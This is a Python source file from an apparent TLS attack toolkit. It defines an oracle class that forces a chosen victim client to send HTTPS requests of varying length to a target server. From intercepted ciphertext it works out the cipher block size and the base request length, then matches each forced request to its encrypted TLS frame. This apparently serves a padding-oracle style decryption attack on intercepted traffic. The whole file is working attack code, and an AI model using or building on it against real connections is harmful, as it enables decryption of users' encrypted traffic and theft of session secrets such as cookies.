import logging
import traceback

from tls_attack.structure.TLSHeader import *
from tls_attack.structure.TLSSource import *

class ForceRequestOracle:
    TLS_HISTORY_LENGTH = 20
    INIT_STEP_COUNT    = 65

    def __init__(self, force_request, https_server, target_client_ip, target_server_host):
        self.force_request_module = force_request
        self.https_server = https_server
        self.is_started = False
        self.ready = False
        self.queue = []
        self.tls_frames = []
        self.target_ip = target_client_ip
        self.base_url = b"https://" + target_server_host
        self.ready_handler = []

    def start(self):
        if not self.is_started:
            self.https_server.on_packet_received(self._https_handler)
            self.force_request_module.start()
            self.https_server.start()
            self.is_started = True
            self._init()

    def on_ready(self, callback):
        self.ready_handler.append(callback)

    # This initialization step is to correctly map the force request
    # to the right TLS encrypted frame. We will force a few request of
    # different length to identify it properly.
    def _init(self):
        logging.info("Initializing the force request oracle.")

        self._init_step = 0
        self._init_stats = []
        self._init_step_fct()

    def _init_step_fct(self):
        # Reset the data
        self.tls_frames = []

        # Force the next request
        self._init_step += 1
        self.force_request_module.force_request(self.target_ip, self.base_url + b"/" + b"A"*self._init_step, b"A=", self._init_callback)

    def _init_callback(self, id):
        for frame in self.tls_frames:
            self._init_stats.append({ "step" : self._init_step, "length" : frame.length })

        if self._init_step < ForceRequestOracle.INIT_STEP_COUNT:
            self._init_step_fct()
        else:
            self._init_analyze()

    def _init_analyze(self):
        def filter_step(step):
            def f(item):
                return item["step"] == step

            return [a for a in filter(f, self._init_stats)]

        min_step = 8 * 4
        previous = filter_step(1)

        # We first identify the block size
        for i in range(2, ForceRequestOracle.INIT_STEP_COUNT + 1):
            current = filter_step(i)

            for el_current in current:
                for el_previous in previous:
                    diff = el_current["length"] - el_previous["length"]

                    if diff > 0 and diff < min_step:
                        min_step = diff

            # We have already correctly identify the block length at this point
            if i > min_step*2:
                break

        self.block_size = min_step

        # We identify the request which increases by exactly the block size.
        baseline =  filter_step(1)
        one_block = filter_step(1 + 1*self.block_size)
        two_block = filter_step(1 + 2*self.block_size)

        base_size = -1

        for el_baseline in baseline:
            found = False

            for el_one_block in one_block:
                if el_one_block["length"] - el_baseline["length"] == self.block_size:
                    found = True
                    break

            if not found:
                continue

            for el_two_block in two_block:
                if el_two_block["length"] - el_baseline["length"] == 2*self.block_size:
                    found = True
                    break

            if found:
                base_size = el_baseline["length"] 
                break

        # We identify the boundary to determine the exact length of the message
        boundary = -1

        for i in range(2, self.block_size + 1):
            for el_current in filter_step(i):
                if el_current["length"] == base_size + self.block_size:
                    boundary = i
                    break

            if not boundary == -1:
                break

        # This value indicates the length of the request forced with and empty
        # URL and empty POST data.
        self.base_length = base_size - boundary - len(b"A=")

        # Start the actual forced request.
        self.ready = True
        self._process_next()

        for callback in self.ready_handler:
            try:
                callback()
            except Exception as err:
                logging.error(traceback.format_exc())

    def force_request(self, url, post_data, callback):
        # The expected length is calibrated with having a none "None" value
        if post_data == None:
            post_data = b""

        self.queue.append({ "url" : url, "post_data" : post_data, "callback" : callback })

        # If we are not ready or there's already an element being
        # processed, we just wait.
        if self.ready and len(self.queue) == 1:
            self._process_next()

    def _process_next(self):
        if len(self.queue) == 0:
            return

        url = self.queue[0]["url"]
        post_data = self.queue[0]["post_data"]

        # Message length
        self.expected_length = len(url) + len(post_data) - 1 + self.base_length
        
        # Ajusting for the Content-Length header that is bigger when post_data get's bigger
        self.expected_length += len(str(len(post_data))) - len(b"0")

        # Message length with the padding
        self.expected_length += self.block_size - (self.expected_length % self.block_size)

        self.tls_frames = []
        self.force_request_module.force_request(self.target_ip, self.base_url + url, post_data)

    def _https_handler(self, connection, structure, state, source):
        if source == TLSSource.CLIENT and structure.content_type == TLSContentType.TLSApplicationData.value:
            if not self.ready:
                # In the initialization phase, we just collect the TLS frame
                # They will later be analyzed	
                self.tls_frames.append(structure)
                self.tls_frames = self.tls_frames[-ForceRequestOracle.TLS_HISTORY_LENGTH:]
            else:
                # If there's no more item in the queue, there's no processig to
                # be done here
                if len(self.queue) == 0:
                    return

                if structure.length == self.expected_length:
                    item = self.queue.pop(0)
                    result = None

                    try:
                        result = item["callback"](connection, structure, state, source)
                    except Exception as err:
                        logging.error(traceback.format_exc())

                    self._process_next()

                    if result:
                        return result



